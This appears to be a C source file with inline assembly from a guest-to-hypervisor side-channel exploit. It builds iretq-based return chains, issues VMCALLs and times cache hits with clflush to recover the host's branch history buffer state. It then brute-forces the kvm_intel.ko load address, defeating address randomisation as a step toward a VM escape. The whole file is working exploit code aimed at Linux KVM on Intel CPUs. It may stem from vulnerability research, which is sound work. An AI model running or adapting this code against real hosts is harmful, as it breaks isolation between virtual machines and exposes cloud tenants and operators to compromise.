#include "common.h"

volatile uint8_t leak_arr[0x4000];
#define leak_test_byte (leak_arr + 0x2000)

void common_callsite(void);
void vmcall_site(void);
asm(
  "common_callsite:\n\t"
  "call *(%rdi)\n\t"
  "iretq\n\t"

  "vmcall_site:\n\t"
  "mov $0xffffff, %rax\n\t"
  "nop\n\t"
  "vmcall\n\t"
  "iretq\n\t"
);

struct rop_stack {
  unsigned long free_stack_space[8000];
  unsigned long rop_stack[1000];
  unsigned long return_rsp_idx;
};

void return_loc(void);

void generate_rop_stack(struct rop_stack *stack, unsigned long target_bhb_state, void (*extra_callsite)(void), int post_extra_flush_iters) {
  if ((target_bhb_state) >= (1UL<<58))
    errx(1, "invalid bhb state input");
  unsigned long *rop_stack_wp = stack->rop_stack;
  unsigned long cs, ss, eflags;
  asm volatile("mov %%ss, %0":"=r"(ss));
  asm volatile("mov %%cs, %0":"=r"(cs));
  asm volatile("pushf\n\tpop %0":"=r"(eflags)); /* some random flags state */

  for (int i=28; i>=0; i--) {
    unsigned long ret_addr_end = ((target_bhb_state>>(i*2))&3)<<6;
    unsigned long iret_addr_end = 0;
    unsigned char *ret_addr = ret_area + ret_addr_end;
    unsigned char *iret_addr = ((iret_addr_end&1) ? iret_area_b : iret_area_a) + iret_addr_end;
    TMOH_ADD_IRETQ_RET_FRAME(ret_addr)
    *(rop_stack_wp++) = (unsigned long)iret_addr;
  }

  if (extra_callsite != NULL) {
    TMOH_ADD_IRETQ_RET_FRAME((unsigned long)extra_callsite)
  }
  for (int i=0; i<post_extra_flush_iters; i++) {
    TMOH_ADD_IRETQ_RET_FRAME(ret_area)
    *(rop_stack_wp++) = (unsigned long)iret_area_a;
  }

  TMOH_ADD_IRETQ_RET_FRAME((unsigned long)common_callsite)

  stack->return_rsp_idx = rop_stack_wp + 3 - stack->rop_stack;
  TMOH_ADD_IRETQ_FRAME((unsigned long)return_loc, 0x42424242424242/*fixed up*/)
}

bool bhb_subtract(unsigned long *bhb_state, const struct jump *jmp) {
  unsigned long src = jmp->src;
  unsigned long dst = jmp->dst;
  *bhb_state ^= (dst & 0x3f);
  *bhb_state ^= (src & 0xc0) >> 6;
  *bhb_state ^= (src & 0xc00) >> (10 - 2);
  *bhb_state ^= (src & 0xc000) >> (14 - 4);
  *bhb_state ^= (src & 0x30) << (6 - 4);
  *bhb_state ^= (src & 0x300) << (8 - 8);
  *bhb_state ^= (src & 0x3000) >> (12 - 10);
  *bhb_state ^= (src & 0x30000) >> (16 - 12);
  *bhb_state ^= (src & 0xc0000) >> (18 - 14);
  bool result = (*bhb_state & 0x3) == 0;
  *bhb_state >>= 2;
  return result;
}

bool bhb_test(unsigned long bhb_state, const struct jump *jumps, int n_jumps) {
  for (int i=n_jumps-1; i>=0; i--) {
    if (!bhb_subtract(&bhb_state, jumps+i)) {
      //printf("bailout at %d\n", i);
      return false;
    }
  }
  return true;
}

void call_rop_stack_(unsigned long fnp, unsigned long stack_start, unsigned long return_rsp_p);
asm(
  "call_rop_stack_:\n\t"
  "mov %rsp, (%rdx)\n\t"
  "mov %rsi, %rsp\n\t"
  "iretq\n\t"
  ".globl return_loc\n\t"
  "return_loc:\n\t"
  "ret\n\t"
);

void call_rop_stack(struct rop_stack *rs, void (**fnp)(void)) {
  struct rop_stack rs_;
  memcpy(&rs_, rs, sizeof(rs_));
  call_rop_stack_((unsigned long)fnp, (unsigned long)rs->rop_stack, (unsigned long)(rs->rop_stack + rs->return_rsp_idx));
  memcpy(rs, &rs_, sizeof(rs_));
}

void (*fnp_area[0x2000])(void);

void memory_load_fn(void);
asm(
  "memory_load_fn:\n\t"
  "mov leak_arr+0x2000(%rip), %r11\n\t"
  "ret\n\t"
);

int measure_fn_hits;
__attribute__((force_align_arg_pointer)) void measure_fn(void) {
  if (is_hot((uint8_t*)leak_test_byte)) {
    measure_fn_hits++;
  }
  clflush(leak_test_byte);
  pipeline_flush();
}

void repeated_invoker(struct rop_stack *rs_victim, struct rop_stack *rs_attacker) {
  void (**fnp)(void) = fnp_area + 0x1000;

  for (int i=0; i<1000; i++) {
    #define INVOKE_ONE(fn,ropstack)  \
      pipeline_flush();              \
      *fnp = fn;                     \
      pipeline_flush();              \
      clflush(fnp);                  \
      clflush(leak_test_byte);       \
      pipeline_flush();              \
      call_rop_stack(ropstack, fnp); \
      pipeline_flush();

    INVOKE_ONE(measure_fn, rs_victim)
    INVOKE_ONE(memory_load_fn, rs_attacker)
    INVOKE_ONE(memory_load_fn, rs_attacker)
  }
}

int main(int argc, char **argv) {
  printf("%s === starting dump_hyper_bhb ===\n", cur_time());
  common_init();
  hot_cold_init();
  srandom(time(NULL));

  // prefault
  *leak_test_byte = 1;

  unsigned long bhb_state = 0;
  for (int pad_after_hypercall = 29; pad_after_hypercall >= 0; pad_after_hypercall--) {
loop_start:;
    int hits_by_new_bits[4] = { 0, 0, 0, 0 };
    for (unsigned long new_bits = 0; new_bits < 4; new_bits++) {
      unsigned long bhb_state_candidate = (bhb_state>>2) | (new_bits<<56);
      struct rop_stack rs_victim;
      generate_rop_stack(&rs_victim, 0, vmcall_site, pad_after_hypercall);
      struct rop_stack rs_attacker;
      generate_rop_stack(&rs_attacker, bhb_state_candidate, NULL, 0);
      measure_fn_hits = 0;
      repeated_invoker(&rs_victim, &rs_attacker);
      hits_by_new_bits[new_bits] = measure_fn_hits;
    }
    //printf("%s counts: %d %d %d %d\n", cur_time(), hits_by_new_bits[0], hits_by_new_bits[1], hits_by_new_bits[2], hits_by_new_bits[3]);
    unsigned long selected_new_bits;
    int selection_count = 0;
    for (unsigned long new_bits = 0; new_bits < 4; new_bits++) {
      if (hits_by_new_bits[new_bits] > 100 && hits_by_new_bits[new_bits] < 900)
        goto step_back;
      if (hits_by_new_bits[new_bits] > 500) {
        selection_count++;
        selected_new_bits = new_bits;
      }
    }
    if (selection_count != 1) {
step_back:;
      pad_after_hypercall++;
      bhb_state = (bhb_state << 2) & ((1UL<<58)-1);
      goto loop_start;
    }
    bhb_state = (bhb_state>>2) | (selected_new_bits<<56);
    printf("%s BHB state with %02d bits padding: 0x%016lx\n", cur_time(), pad_after_hypercall, bhb_state);
  }

  int hits = 0;
  unsigned long result;
  for (unsigned long kvm_intel_base = 0; kvm_intel_base < 0x100000; kvm_intel_base += 0x1000) {
    // kvm_intel_base is unknown; vmlinux addresses are effectively static (because only last 5 hex digits matter)
    struct jump jumps[] = {
      { .src = kvm_intel_base+0x0029, .dst = 0xffffffff81059620    },
      { .src = 0xffffffff81059630   , .dst = kvm_intel_base+0x002a },
      { .src = kvm_intel_base+0x002c, .dst = kvm_intel_base+0xfaf8 },
      { .src = kvm_intel_base+0xfb05, .dst = kvm_intel_base+0xf9b0 },
      { .src = kvm_intel_base+0xf9f3, .dst = kvm_intel_base+0xfb06 },
      { .src = kvm_intel_base+0xfb2d, .dst = kvm_intel_base+0xfb38 },
      { .src = kvm_intel_base+0xfb46, .dst = kvm_intel_base+0xfb4a },
      { .src = kvm_intel_base+0xfbbb, .dst = kvm_intel_base+0xfbc1 }
    };
    if (bhb_test(bhb_state, jumps, 8)) {
      printf("%s kvm_intel.ko base mod 0x100000 is 0x%05lx\n", cur_time(), kvm_intel_base);
      hits++;
      result = kvm_intel_base;
    }
  }

  if (hits == 1) {
    write_ulong_to_file("kvm_intel_load_address", result);
    return 0;
  } else if (hits == 0) {
    printf("%s ERROR no hits!\n", cur_time());
  } else {
    assert("can't happen" && 0);
  }
}
